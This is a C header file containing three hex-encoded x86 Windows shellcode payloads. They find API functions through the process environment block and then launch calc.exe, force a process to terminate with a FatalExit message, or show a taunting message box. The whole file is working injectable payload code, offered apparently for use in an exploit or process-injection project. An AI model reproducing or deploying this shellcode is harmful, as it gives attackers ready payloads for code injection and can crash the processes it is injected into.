#ifndef PAYLOADS_H
#define PAYLOADS_H

//payload shellcodes
const char CALC_SHELLCODE[] = "\x55\x89\xe5\x83\xec\x24\xB8\x78\x65\x63\x41\x25\xFF\xFF\xFF\x00\x50\x68\x57\x69\x6E\x45\x31\xD2\x64\x8B\x5A\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x89\x45\xF4\x8B\x48\x78\x01\xD9\x89\x4D\xF0\x8B\x51\x14\x89\x55\xEC\x8B\x79\x1C\x01\xDF\x89\x7D\xE8\x8B\x71\x20\x01\xDE\x89\x75\xE0\x8B\x51\x24\x01\xDA\x89\x55\xDC\x31\xD2\x89\xE6\x8B\x7D\xE0\x31\xC9\xFC\x8B\x3C\x97\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0D\x42\x8B\x45\xEC\x39\xD0\x77\xE3\x83\xC4\x26\xEB\x3C\x8B\x75\xDC\x8B\x7D\xE8\x66\x8B\x04\x56\x8B\x04\x87\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE7\x6A\x0A\x57\xFF\xD0\x83\xC4\x28";

const char FATALITY_SHELLCODE[] = "\x31\xD2\xB2\x30\x64\x8B\x12\x8B\x52\x0C\x8B\x52\x1C\x8B\x42\x08\x8B\x72\x20\x8B\x12\x80\x7E\x0C\x33\x75\xF2\x89\xC7\x03\x78\x3C\x8B\x57\x78\x01\xC2\x8B\x7A\x20\x01\xC7\x31\xED\x8B\x34\xAF\x01\xC6\x45\x81\x3E\x46\x61\x74\x61\x75\xF2\x81\x7E\x08\x45\x78\x69\x74\x75\xE9\x8B\x7A\x24\x01\xC7\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xC7\x8B\x7C\xAF\xFC\x01\xC7\x68\x20\x21\x00\x00\x68\x33\x4B\x37\x20\x68\x33\x54\x20\x52\x68\x20\x3A\x20\x47\x68\x4C\x31\x37\x59\x68\x46\x34\x54\x34\x89\xE1\x31\xC0\x51\x50\xFF\xD7";

//dosent work when giving alternate instructions
const char MESSAGE_BOX_SHELLCODE[] ="\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x55\x2e\x58\x20\x68\x45\x20\x59\x4f\x68\x49\x20\x53\x45\x31\xdb\x88\x5c\x24\x0a\x89\xe3\x68\x45\x3f\x58\x20\x68\x20\x47\x41\x4d\x68\x41\x59\x20\x41\x68\x4f\x20\x50\x4c\x68\x4e\x54\x20\x54\x68\x55\x20\x57\x41\x68\x4f\x20\x59\x4f\x68\x4f\x2e\x20\x44\x68\x48\x45\x4c\x4c\x31\xc9\x88\x4c\x24\x22\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";

#endif // PAYLOADS_H
